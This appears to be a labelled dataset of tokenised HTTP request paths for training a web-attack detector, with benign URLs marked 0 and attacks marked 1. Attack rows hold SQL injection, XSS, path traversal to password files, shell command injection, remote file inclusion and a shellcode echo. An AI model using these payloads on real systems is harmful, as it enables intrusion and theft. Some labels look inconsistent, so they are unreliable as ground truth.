request	label
/ top . php ? stuff =  ; 	1
/ 20061221p2a00m0sp024000c / 	0
/ string / strings / parameters = -4586 union all select 2068 , 2068 , 2068 , 2068 -- 	1
/ string / strings / parameters = & echo $ ifshywhuo $  (  ( 82 + 84 )  )  $  ( echo $ ifshywhuo ) hywhuo ' 	1
/ scripts / ajax . php ? rs = __exp__getfeedcontent & rsargs [  ]  = -99 union select 1974863202 , 2 , 2009798962 , 4 , 5 , 6 , 7 , 8 , 9 , 0 , 1 , 2 , 3  -- 	1
/ 8e6client06 / 	0
/ n29308075_2 / 	0
/ menuvisualfoxpro / 	0
/ 119863 / 	0
"/ string / strings / parameters = < xml id = cdcat >  < note >  < to >  & lt ; span style = x : exp <  !  [ cdata [ r ]  ]  > ession ( confirm ( 3 )  )  & gt ; hello & lt ;  / span & gt ;  <  / to >  <  / note >  <  / xml >  < table border =  "" 1 ""  datasrc =  ""  # cdcat ""  >  < tr >  < td >  < span datafld =  "" to ""  dataformatas = html >  <  / span >  <  / td >  <  / tr >  <  / table > "	1
/ string / modo = registro & login = gaye & password = kantiana & nombre = fructuoso & apellidos = rodrigo + ambrs & emaila = bloom @ ajuntamentbcn2-0 . sz & dni = 96068417q & direccion = c /  + juan + sebastian + elcano + 178 +  & ciudad = toba & cp = 17741 & provincia = lleida & ntc = 5250839743016206 & b1 = registrar 	1
/ javascript / poll . db 	0
/ cgi / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 35 & b1 = aadir + al + carrito 	0
/ cslogo / 	0
/ string / strings / parameters = & echo $ ifstkzmma $  (  ( 70 + 55 )  )  $  ( echo $ ifstkzmma ) tkzmma ' 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qtrmrj )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ nyjgaorz . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ matt_boat / 	0
/ recordings / store . php ? crn = 42 '  & action = show & show_products_mode = cat_click 	1
/ v15041540 / 	0
/ a1152983 / 	0
/ index . php ? post =  .  .  / config / password 	1
/ javascript / storage . bz2 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo hbifjl )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
"/ mv8wxfy9 . html ?  < script > document . cookie =  "" testrhbc = 8184 ;  ""  <  / script > "	1
/ string / strings / parameters = '  |   [  5 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ string / strings / parameters = belanger 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  (  ""  "" obau ""  ""  =  ""  "" obau "	1
"/ string / strings / parameters = >  ""  ""  < body onload !  #  $  %  &  (  )  *  ~  + -_ .  ,  :  ;  ?  @  [  /  |  \  \  ]  ^  `  = document . cookie = true ;  > "	1
/ string / modo = entrar & login = zaretsky & pwd = 725l479zo & remember =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = entrar 	1
/ cgi-bin / cgiwrap /  < font color = red > 	1
/ vidhome / 	0
/ testimony_0900 / 	0
/ admin / doeditconfig . php ? thispath =  .  .  / includes & config [ path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ? 	1
/ javascript / counts . error 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- "	1
"/ string / strings / parameters = 1 ""  ""  )  as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  -- "	1
/ bpblair1206 / 	0
/ string / strings / parameters = 5292453383315406 	0
/ scgi-bin / pfdisplay . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ manager / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ indian-grants / 	0
/ cgi-bin / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tpcdnb )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ javascript / found . gz 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' irfn '  where 8360 = 8360 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  -- 	1
/ ovcgi / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / winnt / win . ini 	1
/ cefic_tcm25-133813 / 	0
"/ fo564rei . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 '  )  as bfgl where 8959 = 8959 union all select null , null , null , null , null , null , null , null , null , null -- 	1
"/ string / str =  $  ( echo iezshq )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
"/ string / strings / parameters = ""  | echo $ ifscsecod $  (  ( 94 + 97 )  )  $  ( echo $ ifscsecod ) csecod "" "	1
/ string / strings / parameters = vinyals ,  117 4 ? e 	0
/ string / strings / parameters = -1300 )  as rrsm where 1086 = 1086 or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  -- 	1
/ string / strings / parameters = -5066 '  )  )  union all select 9689 , 9689 , 9689 , 9689 # 	1
/ 045940 / 	0
/ javascript / cars . cnf 	0
/ string / strings / parameters = -1076 union all select 3959 , 3959 -- 	1
/ string / strings / parameters = c /  artazuria ,  43 10 ? e 	0
"/ include / error / autherror . cfm ? errorcode = 1 & ftvar_linkp =  ""  >  <  / a >  < script > alert (  ' fusetalk_mult_xss . nasl '  )  <  / script >  < a href =  "" "	1
"/ ydexw8by . php3 ?  < meta http-equiv = set-cookie content =  "" testulex = 4996 ""  > "	1
/ wooncorporatie_rotterdam / 	0
/ string / strings / parameters = 9 	0
/ string / strings / parameters = 1 )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( 3872 = 3872 	1
/ string / strings / parameters = 1 %  '  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  '  %  '  =  ' 	1
"/ string / strings / parameters = 1 ""  ""  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  # "	1
"/ string / strings / parameters = ""  ) print (  ` echo adfeoj echo  $  (  ( 67 + 57 )  )  echo adfeoj echo adfeoj `  )  ;  .  ' adfeoj "	1
/ examples / jsp / jsp2 / jspx / adlayer . php ? layerstyle =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ recent-top / 	0
/ string / modo = registro & login = tamer & password = suto8i + a & nombre = maurino & apellidos = mitjans & email = balzo @ onlinegratis . lv & dni = 19804746k & direccion = antonio + ulloa + 6 + 6 ? d & ciudad = zorita + de + la + frontera & cp = 08759 & provincia = huesca & ntc = 1181707541494323 & b1 = registrar 	0
/ string / strings / parameters = 09107 	0
"/ dslpwt15 . html ?  < meta http-equiv = set-cookie content =  "" testtkio = 5454 ""  > "	1
/ string / str =  $  ( echo mkjxcw )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ 037790 / 	0
/ doc_icons / 	0
/  .  .  .  .  .  .  .  .  .  { file } 	1
/ 000049832 / 	0
/ blogrules / 	0
/ string / strings / parameters = < meta charset = iso-2022-jp >  <  ( jd ( ji ( jv >  < i ( jm ( jg s ( jr ( jc ( j =  ( jx o ( jn ( jer ( jr ( jo ( jr ( j =  ( ja ( jl ( je ( jr ( jt ( 1 )  /  /  ( j <  ( j /  ( jd ( jiv ( j >  ( j 	1
/ 1454165324_thumb1 / 	0
/ article234 / 	0
/ javascript / forum . java 	0
/ msg670018 / 	0
"/ javascript /  . htpasswd . sfish /  \  '  \  "" "	1
"/ main . php ? logout =  ""  \ x0arm \ x09q43175153 \ x09 # "	1
/ 1_1445 / 	0
/ string / strings / parameters = 81667398x 	0
/ index . php ? lang = xxpathxx 	1
/ javascript / records . php 	0
/ muonline-24 / 	0
/ examples / jsp / checkbox / index . php ? op = default & date = 200607 '  union select 1 , 1975764141 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ awstats / awstats . pl ? migrate =  | echo ;  /  .  / tmp / qkzpkuflrb . sh ; echo | awstats916038 . txt 	1
/ string / strings / parameters = saree 	0
/ string / strings / parameters = ' echo $ ifsxlgscn $  (  ( 77 + 2 )  )  $  ( echo $ ifsxlgscn ) xlgscn & 	1
/ alrsweep / 	0
/ string / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ string / strings / parameters = + dir + c :  +  | 	1
"/ main . php ? logout =  ""  & rm \ xa0q69712395 & rem \ xa0 "	1
/ string / strings / parameters = efrain 	0
/ javascript / imgs . nsf 	0
/ javascript / phpmyadmin . tmp 	0
/ string / modo = registro & login = muchow & password = 715417c94or $ i3 & nombre = alexis & apellidos =  '  + and +  ' 1 '  =  ' 1 & email = chantrawiboon @ elreversotenebroso . th & dni = 01597109n & direccion = calle + mula + 4 ,  +  & ciudad = vallurcanes & cp = 22240 & provincia = girona & ntc = 6339495785199828 & b1 = registrar 	1
/ but i ' m with the band / 	1
/ javascript / policy . gz 	0
/ exchange /  .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ diana-report / 	0
/ string / strings / parameters = 37156228g 	0
/ javascript / phf . svn-base 	0
/ string / strings / parameters = romano 	0
"/ j734qobz . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 50sc2e3i6i1172 	0
/ string / strings / parameters = 1 '  )  as gxpb where 7107 = 7107 or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  -- 	1
/ nxrtofpuja / 	0
/ javascript / del . trace 	0
/ en-us / esmozg5d . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / id = 1 & nombre = vino + rioja & precio = 85 & cantidad = 16 & b1 = aadir + al + carrito 	0
/ b2121174 / 	0
/ string / strings / parameters = hatajo 	0
/ string / strings / parameters = benchmark ( 1000000000 , md5 ( char ( 116 )  )  ) 	1
/ wzcrcajbnzt / 	0
/ examples / servlets / servlet / shopaddtocart . asp ? productid =  ' 42 	1
/ javascript / readme . so 	0
/ compile-tips / 	0
/ string / modo = insertar & precio = 9874 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = 1 %  '  )  )  and sleep ( 5 )  and  (  (  '  %  '  =  ' 	1
"/ string / strings / parameters = ""  |   [  1 -ne  $  ( echo zddhyl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # "	1
/ sites / all / libraries / fckeditor / editor / filemanager / browser / default / browser . html 	0
/ string / modo = insertar & precio = 4633 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = prdena 	0
/ string / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi 	1
/ food-porn / 	0
/ javascript / 42 . cgi 	0
/ string / strings / parameters = ;  str =  $  ( echo vhbjgh )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / strings / parameters = 4358738088308536 	0
/ 48b01401 / 	0
"/ string / strings / parameters = 1 ""  ""  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  ""  "" cwwv ""  ""  like  ""  "" cwwv "	1
"/ string / strings / parameters = -5322 ""  ""  union all select 6494 , 6494 , 6494 , 6494 , 6494 , 6494 -- "	1
/ agora_path /  / mdweb / admin / inc / organisations / country_insert . php ? chemin_appli = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  ? 	0
/ report89 / 	0
/ javascript / document . as 	1
"/ string / strings / parameters = < xml onpropertychange xml onpropertychange =  "" javascript : javascript : alert ( 1 )  ""  >  <  / xml onpropertychange > "	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1 "	1
/ contenido_4 . 8 . 4 / contenido / cronjobs / optimize_database . php ? cfg [ path ]  [ contenido ]  = xxpathxx ? 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lvmwxb )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ lib / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / modo = registro & login = ced & password = 1ed6at0zacin & nombre = albida & apellidos = palacios + de + la + fe & email = oury_boskovic8 @ faders . com . tv & dni = 45396998n & direccion = entrada + tamarit ,  + 32 ,  +  & ciudad = abrucena & cp = 05122 & provincia = madrid & ntc = 2641897026324485 & b1 = registrar 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo nwayiz )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' wyng '  from dual where 2157 = 2157 union all select null , null -- 	1
/ 041847 / 	0
/ awstatstotals / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  } 	1
"/ top . php ? stuff =  ""  & ver \ x0b > q26467745 & rem \ x0b "	1
/ 15oct06-usl / 	0
/ string / strings / parameters = 1 '  )  )  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  (  ' tzbp '  =  ' tzbp 	1
/ string / strings / parameters = -9227 )  where 6723 = 6723 union all select 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 -- 	1
/ fujitsu_pcs / 	0
/ string / strings / parameters = 1 )  )  and 9198 = 9198 -- 	1
/ t-shirt_standart / 	0
/ string / strings / parameters = -5130 '  )  )  union all select 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 -- 	1
/ j4drbkil . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
/  ~ felten / 	0
/ 135630 / 	0
"/ d5a5renl . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / uk . dump 	0
/ string / strings / parameters = 1 '  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  ' pziy '  =  ' pziy 	1
"/ help . php ? q =  "" del \ x0bq14893241 & rem \ x0b "	1
/ security_subtitle / 	0
/ john-chambers_cisco / 	0
/ bund_de / 	0
/ string / strings / parameters = escamoneado 	0
/ retrievepassword / 	0
/ phpmyadmin / web_store / web_store . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html 	1
/ string / strings / parameters = 1 '  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  ' zspf '  =  ' zspf 	1
/ string / strings / parameters = | echo twnzdu $  (  ( 10 + 40 )  )  $  ( echo twnzdu ) twnzdu 	1
/ tc20061128_130487 / 	0
/ string / strings / parameters = alm . ora 	0
/ 3574116 / 	0
/ pxagj7n7 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ include . php ? path = contact . php & contact_email =  \  ""  >  & lt ; script & gt ; alert ( document . cookie )  ;  & lt ;  / script & gt ; "	1
"/ string / strings / parameters = < table >  < td background =  ""  "" javascript : document . cookie = true ;  ""  ""  > "	1
/ string / modo = entrar & login = follett & pwd = de21 & remember = off & b1 = entrar 	0
/ 0u75ldxq . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / replica . log 	0
/ string / strings / parameters = | echo $ ifslxluod $  (  ( 68 + 51 )  )  $  ( echo $ ifslxluod ) lxluod 	1
/ string / strings / parameters = 69054908f 	0
/ string / strings / parameters = '   str =  $  ( echo rqfvas )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
"/ string / strings / parameters = ""   str =  $  ( echo yqomci )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ "	1
/ string / strings / parameters = &  & echo wmetwl $  (  ( 1 + 53 )  )  $  ( echo wmetwl ) wmetwl 	1
/ qing_gifts / 	0
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /  .  .  /  { file } 	1
/ admin / tools / utf8conversion / index . php ? path = xxpathxx ? 	1
/ ows-bin / fileseek2 . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ recordings / index . php ? setlang = gcards_dir_transversal . nasl & lang [ gcards_dir_transversal . nasl ]  [ file ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 1 '  )  )  and 3355 = 6012 and  (  (  ' ofmy '  =  ' ofmy 	1
/ ns9907035589 / 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' ymwf '  where 1229 = 1229 or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  )  |  |  ' 	1
/ index . php ? module =  < script > foo <  / script > 	1
/ string / modo = registro & login = klasky & password = tem . tico & nombre = licia & apellidos = maeso + comello & email = verrell . myral @ cafedeteatro . kh & dni = 33908887xany ?   set-cookie :  + tamper = 1041264011025374727 & direccion = plaza + pedro + marcos ,  + 145 +  & ciudad = guadalupe & cp = 36700 & provincia = cdiz & ntc = 4984450191632548 & b1 = registrar 	1
"/ string / strings / parameters = ""  `  '  >  < script >  \ xe2 \ x80 \ x85javascript : alert ( 1 )  <  / script > "	1
/ usamay2001_8 / 	0
"/ string / strings / parameters = < iframe src =  "" http :  /  / target ""  referrerpolicy =  "" no-referrer ""  > "	1
/ digitaleye_path / module . php ? menu = xxpathxx ? 	1
/ datreadme / 	0
/ string / modo = registro & login = dinges & password = v5964 & nombre = alor & apellidos = crovetto + roger & email = voight @ 7horas . li & dni = 71834216h & direccion = c /  + cristobal + quintero + 86 +  & ciudad = castellar + de + santiago & cp = 11140 & provincia = navarra & ntc = 5010003702753512 & b1 = registrar 	0
/ string / strings / parameters = 51407196b 	0
/ examples / jsp / jsp2 / el / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini 	1
/ freeway - missing songs / 	0
/ javascript / abcd1234 . jar 	0
/ 191458 / 	0
/ string / strings / parameters = 4277 	0
/ string / strings / parameters = 1 + union + select + 1 , 2 , 3 ; 	1
/ scelti / 	0
"/ h4bi26jd . exe ?  < script > document . cookie =  "" testhrzx = 1150 ;  ""  <  / script > "	1
/ string / strings / parameters = |   [  7 -ne  $  ( echo hdechs  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
"/  /  <  / p >  < body >  < script / src =  "" http :  /  / www . example . com / test ? rnd = q29464737 ""  >  <  / script >  < p > "	1
/ classes / query . class . php ? basedir = xxpathxx 	1
/ hot_right / 	0
"/ string / strings / parameters = -9142 %  ""  ""  )  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / modo = entrar & login = yezi & pwd = adestra & remember = off /  & b1 = entrar 	1
/ 341968 / 	0
/ string / id = 1 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 97 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = -5449 '  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  ' ryvy '  like  ' ryvy 	1
/ 237013 / 	0
"/ string / strings / parameters = 1 ""  ""  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  ""  "" snwx ""  ""  like  ""  "" snwx "	1
/ dreamship / 	0
/ manager / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00 	1
/ string / strings / parameters = 08580215l 	0
/ string / modo = registro & login = bobbette & password = v4n0c76 . se & nombre = albere & apellidos = casa + aro-ca & email = mallalieu @ soymuyguapa . ml & dni = 58990935y & direccion = plaa + puerto + rico ,  + 144 +  & ciudad = guadalajara & cp = 21320 & provincia = soria & ntc = 0626053300449217 & b1 = registrar 	1
/ string / strings / parameters = 123 /  *  ! or *  / 1 = 1 ; 	1
/ cgi-bin / index . php ? id = egyb16sayu ' 	1
/ string / strings / parameters = 5259660554384998 	0
/ string / strings / parameters = obolensky @ etnics . hr 	0
"/ string / strings / parameters = < layer src =  ""  "" http :  /  / vulnerability-lab . com / script . html ""  ""  >  <  / layer > "	1
/ msg00253 / 	0
/ examples / jsp / error / index . php ? op = default & date = 200607 '  union select 1 , 1284682657 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo dajiyu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ string / modo = registro & login = gonzaga & password = acontecimiento & nombre = redenta & apellidos = libano + parramon & email = vigran @ maletti . cy & dni = 24320656l & direccion = calle + tagarnina ,  + 120 ,  + 13c & ciudad = tor .  . m * os & cp = 10748 & provincia = castelln & ntc = 6815796601581594 & b1 = registrar 	1
/ veteran / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 0c + 20 + ae + 75 + e9 + e2 + f7 + 8b + 73 + 18 + 8d + 45 + 0d + 50 + 6a + 0e + e8 + 18 + 00 + 00 + 00 + 50 + 8d + 45 + 1b +  +  >  > ctdn "	1
"/ bmeun223 . aspx ?  < meta http-equiv = set-cookie content =  "" testhhwu = 7044 ""  > "	1
/ string / modo = insertar & precio = 898 & b1 = confirmar / 	1
/ entrylevelloanprocessor / 	0
/ string / strings / parameters = sin sol 1 	0
/ javascript / wiki . htm 	0
/ 0920051299 / 	0
/ string / strings / parameters = aldebar 	0
"/ string / strings / parameters = < image style =  ' filter : url (  "" data : image / svg + xml ,  < svg xmlns =  "" http :  /  / www . w3 . org / 2000 / svg ""  >  < script > parent . alert ( 129 )  <  / script >  <  / svg >  ""  )  '  > "	1
/ examples / jsp / error / showproduct . php ? product = 1 ' 	1
/ examples / jsp / jsp2 / jspx / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc 	1
/ string / strings / parameters = repuesta 	0
/ kinderstart_law / 	0
/ string / strings / parameters = c /  nogueira ,  86 11b 	0
/ string / strings / parameters = '  |  | echo fqfysl $  (  ( 20 + 12 )  )  $  ( echo fqfysl ) fqfysl 	1
/ 5qp0d006us / 	0
/ doinfo / 	0
/ string / strings / parameters = 1 %  '  union all select null , null , null , null , null , null # 	1
/ string / strings / parameters = '  & echo bjunbg $  (  ( 90 + 77 )  )  $  ( echo bjunbg ) bjunbg & 	1
/ javascript / addpost . cc 	0
/ string / strings / parameters = 1 )  )  as mlpf where 7425 = 7425 ; select sleep ( 5 )  -- 	1
/ string / strings / parameters = caster @ videotubo . pr 	0
/ examples / jsp / checkbox / index . php ? post =  .  .  / config / password 	1
/ howto-windows / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
"/ main . php ? logout =  "" rm \ xa0q51679818 & rem \ xa0 "	1
/ help . php ? q =  '  \ x0auname  > q56533456  # 	1
/ string / strings / parameters = 80537471g 	0
/ cgi-915 / vssetcookie . exe 	1
/ javascript / filez . part 	0
/ examples / jsp / jsp2 / el / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00 	1
/ guiprojects / 	0
/ seamstress / 	0
/  .  /  /  .  /  { file } 	1
"/ bl8sefdm . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = d3s7ota5 	0
"/ top . php ? stuff =  ""  \ x0dsleep \ x098 \ x09 # "	1
/ string / strings / parameters = ;  str =  $  ( echo kkiqnh )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / strings / parameters = |   [  7 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ javascript / compress . manifest 	0
/ 000048683 / 	0
